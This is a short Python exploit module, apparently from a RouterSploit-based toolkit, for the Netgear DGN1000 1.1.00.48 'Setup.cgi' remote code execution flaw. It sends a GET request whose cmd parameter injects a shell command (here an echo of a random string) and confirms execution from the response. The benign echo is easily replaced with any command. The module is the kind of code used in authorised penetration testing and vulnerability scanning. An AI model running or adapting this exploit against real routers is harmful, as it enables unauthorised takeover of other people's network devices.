from routersploit.core.exploit import *
from routersploit.core.exploit.utils import random_text
from routersploit.core.http.http_client import HTTPClient
from routersploit.extsploit import SearchClient


class Exploit(HTTPClient, SearchClient):
    __info__ = {
        "name": "netgear dgn1000_1_1_00_48 rce",
        "description": "Netgear DGN1000 1.1.00.48 - 'Setup.cgi' Remote Code Execution",
        "authors": (
            "seebug",  # vulnerability discovery
        ),
        "references": (
            "https://www.exploit-db.com/exploits/43055/",
        ),
        "devices": (
            "Netgear router",
        ),
    }
    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort("", "Target HTTP port")

    def run(self):
        result = {}

        rand_str = random_text(10)
        cmd = 'echo {}'.format(rand_str)
        path = '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd={}&curpath=/&currentsetting.htm=1'.format(cmd)
        response = self.http_request(
            method="GET",
            path=path
        )

        if response and rand_str in response.text:
            result['ExploitInfo'] = {}
            result['ExploitInfo']['URL'] = '{}:{}{}'.format(self.target, self.port, path)

        return result
